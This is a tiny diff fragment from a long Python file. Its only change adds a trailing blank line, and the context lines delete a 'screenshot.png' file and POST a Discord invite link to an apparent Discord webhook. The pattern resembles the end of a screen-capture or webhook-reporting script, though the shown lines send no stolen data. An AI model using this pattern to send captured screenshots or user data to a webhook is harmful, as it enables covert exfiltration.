@@ -1253,3 +1253,4 @@ os.remove("screenshot.png")
 payload = {"content": "https://discord.gg/fnNd26Depz"}
 
 response = requests.post(whook, json=payload)
+
